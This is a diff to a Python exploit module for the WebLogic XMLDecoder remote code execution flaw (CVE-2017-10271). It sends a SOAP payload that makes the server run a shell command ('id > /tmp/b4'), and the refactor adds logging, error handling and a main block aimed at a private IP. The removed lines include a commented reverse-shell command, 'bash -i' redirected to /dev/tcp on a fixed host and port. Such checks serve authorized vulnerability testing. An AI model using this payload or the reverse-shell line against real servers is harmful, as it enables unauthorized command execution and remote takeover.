@@ -1,21 +1,14 @@
-#!/usr/bin/env python
-# coding: utf-8
-# Date  : 2018-07-12 09:37:48
-# Author: b4zinga
-# Email : b4zinga@outlook.com
-# Func  : weblogic xml decoder
-
 import requests
+from lib.log import logger
+from typing import Optional
 
-def run(url):
-    """CVE-2017-10271"""
-    url = url + ":7001/wls-wsat/CoordinatorPortType"
-
+def run(url: str) -> Optional[str]:
+    """Exploit WebLogic XMLDecoder vulnerability (CVE-2017-10271)."""
+    target_url = f"{url}:7001/wls-wsat/CoordinatorPortType"
     headers = {
-            "Content-Type":"text/xml;charset=UTF-8",
-            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
-        }
-    # <string>bash -i &gt;&amp; /dev/tcp/192.168.1.133/4444 0&gt;&amp;1</string>
+        "Content-Type": "text/xml;charset=UTF-8",
+        "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
+    }
     xml = """
         <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> 
             <soapenv:Header>
@@ -30,17 +23,29 @@ def run(url):
                                     <string>-c</string>
                                 </void>
                                 <void index="2">
-                                <string>id > /tmp/b4</string>
+                                    <string>id > /tmp/b4</string>
                                 </void>
                             </array>
-                        <void method="start"/></void>
-                    </java>
-                </work:WorkContext>
-            </soapenv:Header>
-        <soapenv:Body/>
+                            <void method="start"/>
+                        </java>
+                    </work:WorkContext>
+                </soapenv:Header>
+            <soapenv:Body/>
         </soapenv:Envelope>"""
-    req = requests.post(url, headers=headers, data=xml, timeout=5, verify=False)
-    if req.status_code == 500:
-        return "WebLogic XMLDecoder Vulnerable"
-    else:
-        return False
+    try:
+        logger.info(f"Sending XML payload to {target_url}")
+        response = requests.post(target_url, headers=headers, data=xml, timeout=5, verify=False)
+        if response.status_code == 500:
+            logger.success("WebLogic XMLDecoder Vulnerable")
+            return "WebLogic XMLDecoder Vulnerable"
+        logger.warning(f"Failed, status code: {response.status_code}")
+        return None
+    except requests.RequestException as e:
+        logger.error(f"Request failed: {str(e)}")
+        return None
+    except Exception as e:
+        logger.error(f"Unexpected error: {str(e)}")
+        return None
+
+if __name__ == "__main__":
+    print(run("http://192.168.27.128"))
